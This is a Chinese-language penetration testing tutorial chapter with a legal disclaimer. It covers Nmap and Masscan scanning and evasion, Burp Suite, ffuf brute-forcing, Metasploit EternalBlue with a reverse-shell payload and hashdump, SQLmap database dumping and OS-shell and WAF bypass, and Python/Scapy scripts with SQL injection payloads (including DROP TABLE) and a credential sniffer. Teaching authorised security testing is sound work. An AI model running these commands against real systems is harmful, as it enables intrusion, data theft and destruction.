渗透测试工具全指南

渗透测试（Penetration Testing）是通过模拟真实攻击者的手法来评估系统安全性的过程。本章系统性地介绍渗透测试的完整流程与核心工具集，从信息收集到后渗透利用，覆盖每个阶段的关键技术与工具。

学习目标
  • 掌握渗透测试的标准方法论与完整流程
  • 熟练使用 Nmap、Burp Suite、Metasploit 等核心工具
  • 理解被动侦察与主动扫描的区别和适用场景
  • 能够编写 Python 自动化安全脚本
  • 了解后渗透阶段的权限提升与横向移动技术
法律声明

在未经授权的情况下对任何系统进行渗透测试是违法行为。请仅在自己的实验环境或取得书面授权后进行安全测试。本章内容仅用于教育目的。

2.2 主动侦察 (Active Reconnaissance)

主动侦察直接与目标交互，可能被检测到。核心工具是 Nmap。

2.2.1 Nmap - 网络扫描之王

Nmap 扫描类型决策树： 需要什么信息？ │ ├── 主机发现（哪些主机在线？） │ └── nmap -sn 192.168.1.0/24 │ ├── 端口扫描（哪些端口开放？） │ ├── TCP Connect 扫描: nmap -sT (完整三次握手，易被检测) │ ├── SYN 半开扫描: nmap -sS (仅发 SYN，默认，需 root) │ ├── UDP 扫描: nmap -sU (检测 UDP 服务，较慢) │ ├── FIN/Xmas/Null: nmap -sF/-sX/-sN (绕过简单防火墙) │ └── ACK 扫描: nmap -sA (探测防火墙规则) │ ├── 服务/版本检测（什么服务？什么版本？） │ └── nmap -sV --version-intensity 5 │ ├── 操作系统检测 │ └── nmap -O │ └── NSE 脚本引擎（漏洞检测/自动化） └── nmap --script=vuln,default
# === Nmap 常用命令 ===

# 1. 主机发现（Ping Scan）
nmap -sn 192.168.1.0/24                # ICMP + ARP 发现局域网主机
nmap -sn -PS22,80,443 10.0.0.0/24      # TCP SYN Ping 指定端口

# 2. 端口扫描
nmap -sS -p- target.com                 # SYN 扫描所有 65535 个端口
nmap -sS -p 1-1000 target.com           # 扫描前 1000 个端口
nmap -sS --top-ports 100 target.com     # 扫描最常见的 100 个端口
nmap -sU --top-ports 20 target.com      # UDP 扫描 Top 20 端口

# 3. 服务版本检测
nmap -sV -sC target.com                 # 版本检测 + 默认脚本
nmap -A target.com                       # 全面扫描（-sV -sC -O --traceroute）

# 4. NSE 脚本
nmap --script=http-enum target.com       # Web 目录枚举
nmap --script=smb-vuln* target.com       # SMB 漏洞检测
nmap --script=vuln target.com            # 运行所有漏洞检测脚本
nmap --script=ssl-heartbleed target.com  # 检测 Heartbleed

# 5. 输出保存
nmap -sV -oA scan_results target.com    # 同时保存三种格式
nmap -sV -oN normal.txt target.com      # 普通格式
nmap -sV -oX results.xml target.com     # XML格式（可导入其他工具）

# 6. 规避检测
nmap -sS -T2 -f --data-length 50 target.com  # 慢速+分片+随机数据长度
nmap -D RND:10 target.com               # 使用随机诱饵 IP

2.2.2 Masscan - 大规模快速端口扫描

# Masscan - 号称全球最快端口扫描器
# 可以在 6 分钟内扫描整个互联网

# 基本扫描
masscan 10.0.0.0/8 -p 80,443,8080 --rate 10000

# 扫描常用端口
masscan 192.168.0.0/16 -p 21-25,80,443,3306,3389,8080 --rate 5000

# 输出为 Nmap 兼容的 XML
masscan 10.0.0.0/24 -p 1-65535 --rate 1000 -oX results.xml

# 注意：Masscan 速度快但不做服务识别
# 通常工作流：masscan 快速发现开放端口 → Nmap 详细探测服务
Nmap vs Masscan

Masscan 适合大规模网段的快速端口发现；Nmap 适合精确的服务识别和漏洞检测。实战中常结合使用：先用 Masscan 扫全网段定位存活主机和开放端口，再用 Nmap 对发现的目标做深入探测。

3. Web 扫描工具

3.1 Burp Suite - Web 渗透测试必备

Burp Suite 是 Web 安全测试最重要的工具，集成了代理、扫描、爬虫、重放等功能于一体。

Burp Suite 工作流架构： ┌─────────────────────────────────────────────────────────────────────┐ │ Burp Suite Professional │ ├─────────────────────────────────────────────────────────────────────┤ │ │ │ 浏览器 ──▶ [Proxy] ──▶ 目标服务器 │ │ │ ▲ │ │ ▼ │ │ │ [HTTP History] │ │ │ │ │ ┌─────────┼─────────┬─────────────┬──────────────┐ │ │ ▼ ▼ ▼ ▼ ▼ │ │ [Scanner] [Repeater] [Intruder] [Decoder] [Comparer] │ │ 自动漏洞 手动重放 自动化攻击 编解码 响应对比 │ │ 扫描 修改测试 暴力破解 │ │ │ │ [Extender] ──── BApp Store (插件市场) │ │ Autorize, Logger++, JWT Editor, Param Miner... │ │ │ └─────────────────────────────────────────────────────────────────────┘

3.1.1 Proxy（代理拦截）

# 配置步骤：
# 1. Burp 默认监听 127.0.0.1:8080
# 2. 浏览器配置 HTTP 代理指向 127.0.0.1:8080
# 3. 安装 Burp 的 CA 证书以拦截 HTTPS 流量
#    访问 http://burp 下载证书并导入浏览器

# 拦截模式 (Intercept):
# - 可以实时修改请求/响应
# - 修改参数、Cookie、Header
# - 适合手动测试特定功能点

# HTTP History:
# - 记录所有经过代理的流量
# - 支持过滤和搜索
# - 右键发送到其他模块

3.1.2 Scanner（自动漏洞扫描）

# Burp Scanner 功能（Professional 版）:
# - 主动扫描：发送 Payload 测试漏洞
# - 被动扫描：分析已有流量中的安全问题

# 扫描策略配置：
# 1. 右键 HTTP History 中的请求 → "Scan"
# 2. 选择扫描类型:
#    - Crawl and Audit (爬取并审计)
#    - Audit selected items (审计选定项)
# 3. 可配置扫描深度和 Payload 类型

# 常见发现:
# - SQL Injection
# - Cross-Site Scripting (XSS)
# - OS Command Injection
# - Path Traversal
# - Information Disclosure

3.1.3 Repeater（请求重放）

# Repeater 工作流:
# 1. 从 Proxy History 右键 → Send to Repeater
# 2. 手动修改请求参数
# 3. 点击 Send 发送，观察响应
# 4. 适合逐步测试和验证漏洞

# 使用场景:
# - 手动测试 SQL Injection payload
# - 修改 HTTP 头部绕过认证
# - 测试不同参数值的服务器行为
# - 验证扫描器发现的漏洞

3.1.4 Intruder（自动化攻击）

# Intruder 攻击模式:
#
# 1. Sniper（狙击手）
#    - 单个 payload 位置逐一替换
#    - 用于：测试单个参数的多个值
#
# 2. Battering Ram（攻城锤）
#    - 所有位置使用相同 payload
#    - 用于：用户名密码相同的测试
#
# 3. Pitchfork（叉子）
#    - 多个 payload 位置，一一对应
#    - 用于：用户名和对应密码的配对测试
#
# 4. Cluster Bomb（集束炸弹）
#    - 多个 payload 位置，全排列组合
#    - 用于：暴力破解用户名+密码

# 示例: 暴力破解登录表单
# POST /login HTTP/1.1
# username=§admin§&password=§123456§
# 设置 Payload Set 1: 用户名字典
# 设置 Payload Set 2: 密码字典
# 使用 Cluster Bomb 模式

3.4.3 ffuf - Fuzz Faster U Fool

# ffuf - 高性能 Web Fuzzer，功能远不止目录爆破

# 目录枚举
ffuf -u http://target.com/FUZZ -w wordlist.txt

# 参数 Fuzzing
ffuf -u "http://target.com/page?FUZZ=value" -w params.txt

# 值 Fuzzing
ffuf -u "http://target.com/page?id=FUZZ" -w numbers.txt

# POST 数据 Fuzzing
ffuf -u http://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w passwords.txt -fc 401

# VHOST 发现
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fc 302

# 过滤选项
# -fc 过滤状态码  -fs 过滤响应大小  -fw 过滤单词数  -fl 过滤行数
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404,403 -fs 1234
目录爆破工具选择建议
  • ffuf：最灵活，适合各种 Fuzzing 场景，速度极快
  • gobuster：简单高效，适合快速目录和子域名枚举
  • dirsearch：内置字典好，递归扫描方便，适合新手

4. 漏洞利用 (Exploitation)

4.1 Metasploit Framework

Metasploit 是最强大的渗透测试框架，集成了漏洞利用、Payload 生成、后渗透等功能。

Metasploit 架构： ┌───────────────────────────────────────────────────────────────┐ │ Metasploit Framework │ ├───────────────────────────────────────────────────────────────┤ │ │ │ Interfaces: msfconsole | msfcli | Armitage(GUI) | API │ │ │ ├────────────┬────────────┬───────────┬──────────┬─────────────┤ │ Exploits │ Payloads │ Auxiliary │ Post │ Encoders │ │ 漏洞利用 │ 攻击载荷 │ 辅助模块 │ 后渗透 │ 编码器 │ │ │ │ │ │ │ │ remote │ singles │ scanners │ gather │ x86/shikata │ │ local │ stagers │ fuzzers │ escalate │ cmd/generic │ │ webapp │ stages │ dos │ persist │ php/base64 │ │ │ │ gather │ │ │ ├────────────┴────────────┴───────────┴──────────┴─────────────┤ │ Database (PostgreSQL) │ │ 存储扫描结果、凭据、会话信息 │ └───────────────────────────────────────────────────────────────┘
# === Metasploit 基本使用 ===

# 启动
msfdb init          # 初始化数据库
msfconsole          # 启动主控制台

# 搜索模块
msf6> search type:exploit platform:windows smb
msf6> search cve:2021-44228       # 搜索 Log4Shell
msf6> search name:tomcat

# 使用模块
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> info                         # 查看模块详情
msf6> show options                 # 查看需要设置的参数

# 配置参数
msf6> set RHOSTS 192.168.1.100     # 目标地址
msf6> set LHOST 192.168.1.50       # 本机地址（接收反弹shell）
msf6> set LPORT 4444               # 本机监听端口

# 选择 Payload
msf6> show payloads
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 执行攻击
msf6> exploit                      # 或 run
msf6> exploit -j                   # 后台运行

# Meterpreter 常用命令（获取shell后）

meterpreter> hashdump              # 导出密码哈希

meterpreter> getsystem             # 尝试提权
meterpreter> migrate PID           # 迁移到其他进程

4.2 SQLmap - SQL 注入自动化工具

# === SQLmap 基本用法 ===

# 检测 GET 参数注入
sqlmap -u "http://target.com/page?id=1" --batch

# 检测 POST 参数注入
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch

# 使用 Burp 请求文件
sqlmap -r request.txt --batch

# 指定注入点（使用 * 标记）
sqlmap -u "http://target.com/page?id=1*&name=test" --batch

# === 常见场景 ===

# 枚举数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 枚举表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 枚举列
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# 导出数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# 获取操作系统 Shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# === 高级技巧 ===

# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 指定注入技术
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
sqlmap -u "http://target.com/page?id=1" --technique=BEU

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

import requests
from concurrent.futures import ThreadPoolExecutor

# === 基本漏洞探测脚本 ===

def check_sql_injection(url, param):
    """测试简单的 SQL 注入"""
    payloads = ["'", "\"", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--"]

    for payload in payloads:
        params = {param: payload}
        try:
            response = requests.get(url, params=params, timeout=10)
            # 检测错误信息泄露
            error_signs = ['SQL syntax', 'mysql_', 'ORA-', 'PostgreSQL', 'sqlite3']
            for sign in error_signs:
                if sign.lower() in response.text.lower():
                    print(f"[!] 可能存在 SQL 注入: {url}?{param}={payload}")
                    print(f"    错误特征: {sign}")
                    return True
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求失败: {e}")

    return False

# === 目录枚举脚本 ===

def directory_brute(base_url, wordlist_path, threads=20):
    """多线程目录枚举"""
    found = []

    with open(wordlist_path, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]

    def check_path(path):
        url = f"{base_url}/{path}"
        try:
            resp = requests.get(url, timeout=5, allow_redirects=False)
            if resp.status_code in [200, 301, 302, 403]:
                print(f"[{resp.status_code}] {url}")
                found.append((url, resp.status_code))
        except:
            pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_path, paths)

    return found

# === 子域名枚举 ===

def subdomain_enum(domain, wordlist_path):
    """子域名暴力枚举"""
    found_subdomains = []

    with open(wordlist_path, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]

    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            resp = requests.get(url, timeout=3)
            print(f"[+] 发现: {sub}.{domain} [{resp.status_code}]")
            found_subdomains.append(f"{sub}.{domain}")
        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.Timeout:
            pass

    return found_subdomains

from scapy.all import *

# === 端口扫描器 ===

def syn_scan(target, ports):
    """SYN 半开扫描（需要 root 权限）"""
    open_ports = []

    for port in ports:
        # 构造 SYN 包
        pkt = IP(dst=target) / TCP(dport=port, flags='S')
        # 发送并等待响应
        resp = sr1(pkt, timeout=1, verbose=0)

        if resp is not None:
            if resp.haslayer(TCP):
                if resp[TCP].flags == 0x12:  # SYN-ACK
                    open_ports.append(port)
                    # 发送 RST 关闭连接
                    rst = IP(dst=target) / TCP(dport=port, flags='R')
                    send(rst, verbose=0)

    return open_ports

# === ARP 扫描（局域网主机发现）===

def arp_scan(network):
    """ARP 扫描局域网"""
    # 构造 ARP 请求
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    # 发送并接收响应
    answered, unanswered = srp(packet, timeout=2, verbose=0)

    hosts = []
    for sent, received in answered:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"[+] {received.psrc:16s} {received.hwsrc}")

    return hosts

# === 简单的 Packet Sniffer ===

def packet_callback(packet):
    """数据包回调函数"""
    if packet.haslayer(TCP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        print(f"TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")

    # 检测明文密码
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        keywords = ['user', 'pass', 'login', 'password']
        for keyword in keywords:
            if keyword in payload.lower():
                print(f"[!] 可能的凭据: {payload[:200]}")
                break

def ping_sweep(network_prefix, start=1, end=254):
    """ICMP Ping 扫描"""
    alive_hosts = []

    for i in range(start, end + 1):
        target = f"{network_prefix}.{i}"
        pkt = IP(dst=target) / ICMP()
        resp = sr1(pkt, timeout=0.5, verbose=0)

        if resp is not None:
            alive_hosts.append(target)
            print(f"[+] {target} is alive")

    return alive_hosts
